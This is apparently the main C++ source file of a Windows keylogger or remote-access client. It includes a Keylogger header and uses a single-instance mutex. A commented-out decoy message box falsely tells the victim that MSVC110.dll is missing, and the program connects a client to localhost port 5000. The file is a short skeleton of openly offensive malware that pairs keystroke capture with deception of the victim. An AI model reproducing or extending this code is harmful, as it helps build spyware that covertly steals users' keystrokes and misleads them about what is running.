﻿#undef _WINSOCKAPI_
#define _WINSOCKAPI_

#define DEBUG

#include "Client.h"

#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <thread>
#include "Keylogger.h"

static const char mutex[] = "{31b633eb-b3c9-4120-9a95-8264f3961837}";

/*
void msgbox_thread()
{
	MessageBoxA(NULL, "The program can't start because MSVC110.dll is missing from your computer"\
		" Try reinstalling the program to fix this problem.", "msvc - System Error", MB_ICONERROR);
}
*/

int main()
{
	HANDLE hMutex = CreateMutexA(NULL, TRUE, mutex);

	if (GetLastError() == ERROR_ALREADY_EXISTS)
		return EXIT_FAILURE;

	Client client("127.0.0.1", 5000);

	getchar();
    	return 0;
}
